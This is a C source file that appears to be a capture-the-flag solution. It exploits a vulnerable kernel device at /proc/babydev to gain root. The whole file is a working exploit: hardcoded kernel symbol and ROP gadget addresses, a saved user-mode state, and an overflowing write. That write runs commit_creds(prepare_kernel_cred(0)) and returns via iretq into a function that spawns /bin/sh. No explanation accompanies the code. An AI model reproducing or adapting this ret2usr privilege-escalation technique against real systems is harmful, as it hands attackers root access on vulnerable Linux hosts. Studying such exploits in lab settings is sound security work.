#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/timerfd.h>
#include<fcntl.h>


unsigned long long commit_creds = 0xffffffff81052830ull;
unsigned long long prepare_kernel_cred = 0xffffffff81052a60ull;

unsigned long long pop_rdi = 0xffffffff81079d8dull;
unsigned long long pop_rdx = 0xffffffff811265b6ull;
unsigned long long mov_rdi_rax_call = 0xffffffff81067c26ull;

unsigned long long swapgs_pop_rbp = 0xffffffff81200d7eull;

unsigned long long iretq = 0xffffffff81015036ull;
unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;

unsigned long long pop_r11_pop_rbp = 0xffffffff811330a8ull;
unsigned long long pop_rcx = 0xffffffff8105cd7bull;

unsigned long long sysret = 0xffffffff81200106ull;

unsigned long long ret = 0xffffffff810001dcull;


static void shell() {
  char *v[] = {"/bin/sh",0};
  execve(v[0],v,0);
}


void save_state() {
 asm(
    "movq %%cs, %0\n"
    "movq %%ss, %1\n"
    "movq %%rsp, %2\n"
    "pushfq\n"
    "popq %3\n"
    : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
    :
    : "memory");
}


void privilge_escalation() {
    char* (*pkc)(int) = prepare_kernel_cred;
    int (*cc)(char*) = commit_creds;
    (*cc)( (*pkc)(0) );
}


int main(void) {

    save_state();
    int fd = open("/proc/babydev",O_RDWR);
    unsigned long long data[] = {
        0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0,
        privilge_escalation,
        iretq,
        shell,
        user_cs,
        user_rflags,
        user_sp,
        user_ss
    };
    write(fd, (unsigned long long)data + 4, 8 * 0x20);

	return 0;
}
